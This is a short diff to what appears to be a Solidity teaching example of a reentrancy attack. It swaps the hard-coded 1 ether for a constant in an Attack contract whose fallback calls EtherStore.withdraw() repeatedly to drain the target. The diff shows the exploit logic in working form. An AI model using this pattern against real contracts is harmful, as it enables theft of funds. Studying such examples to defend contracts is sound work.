@@ -53,6 +53,7 @@ contract EtherStore {
 
 contract Attack {
     EtherStore public etherStore;
+    uint256 constant public AMOUNT = 1 ether;
 
     constructor(address _etherStoreAddress) {
         etherStore = EtherStore(_etherStoreAddress);
@@ -60,14 +61,14 @@ contract Attack {
 
     // Fallback is called when EtherStore sends Ether to this contract.
     fallback() external payable {
-        if (address(etherStore).balance >= 1 ether) {
+        if (address(etherStore).balance >= AMOUNT) {
             etherStore.withdraw();
         }
     }
 
     function attack() external payable {
-        require(msg.value >= 1 ether);
-        etherStore.deposit{value: 1 ether}();
+        require(msg.value >= AMOUNT);
+        etherStore.deposit{value: AMOUNT}();
         etherStore.withdraw();
     }
 
